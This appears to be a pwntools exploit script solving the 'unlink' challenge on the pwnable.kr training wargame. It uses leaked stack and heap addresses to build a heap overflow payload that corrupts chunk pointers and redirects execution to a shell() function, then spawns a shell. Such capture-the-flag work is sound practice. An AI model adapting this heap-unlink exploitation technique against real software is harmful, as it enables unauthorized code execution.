from pwn import *

# details                                                                                                                                                                                                                                                                                                            
HOST = "pwnable.kr"
PORT = 2222
USER = "unlink"
PASSWORD = "guest"

#context.log_level = 'debug'


def main():
    s = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
    r = s.process(['/home/unlink/unlink'])
    stack_leak = r.recvline(keepends=False)
    stack_leak = int(stack_leak.decode("latin-1").split(": ")[1], 16)
    heap_leak = r.recvline(keepends=False)
    heap_leak = int(heap_leak.decode("latin-1").split(": ")[1], 16)
    ebp_addr = stack_leak + 0x10  # 0x10 is the offset between the leak and the address of ebp-0x4 on                                                                                                                                                                                             
    # the stack (checked in gdb via running the program multiple times and checking the offset)                                                                                                                                                                                                                      
    shell_ptr_on_heap = heap_leak + 0x30

    """
    Payload layout (in this exact order
    """
    A_buf = b"A" * 8  # A's buf variable (in the struct 'tagOBJ' in the source) overflow                                                                                                                                                                                                                             

    B_prev_size = b"B" * 4  # B's prev_size variable (in malloc internals) overflow                                                                                                                                                                                                                                  
    B_size = b"C" * 4  # B's size variable (in malloc internals) overflow                                                                                                                                                                                                                                            
    B_fd = p32(ebp_addr - 0x4)  # B's fd pointer (in the struct 'tagOBJ') overflow     
    B_bk = p32(shell_ptr_on_heap + 0x4)  # B's bk pointer (in the struct 'tagOBJ') overflow     --- the (+plus 0x4) is for ecx-0x4
    B_buf = b"D" * 8  # B's buf variable (in the struct 'tagOBJ') overflow                                                                                                                                                                                                                                           

    C_prev_size = b"E" * 4  # B's prev_size variable (in malloc internals) overflow                                                                                                                                                                                                                                  
    C_size = b"F" * 4  # B's size variable (in malloc internals) overflow                                                                                                                                                                                                                                            
    C_fd = p32(0x080484eb)  # C's fd pointer (in the struct 'tagOBJ') overflow      ----- where the shell_ptr_on_heap will point to (calculated in gdb)                                                                                                                                                                                                
    C_bk = b"PPPP" # C's bk pointer (in the struct 'tagOBJ') overflow                                                                                                                                                                                                

    payload = A_buf + B_prev_size + B_size + B_fd + B_bk + B_buf + C_prev_size + C_size + C_fd + C_bk
    with open("inp", "wb") as f:
        f.write(payload)
    r.sendlineafter(b'now that you have leaks, get shell!\n', payload)
    r.interactive()  # get a shell                                                                                                                                                                                                                                                                                   


if __name__ == '__main__':
    main()
    
    
    
    #B_fd = (address of $ebp-0x4) -minus 0x4
    #B_bk = (heap_leak + 0x30) +plus 0x4
    #C_fd = shell() function addr

    # in ebp-0x4 needs to be (heap pointer to shell() function)+4
    # in ecx-0x4 needs to be pointer in the heap to shell() function address.
    
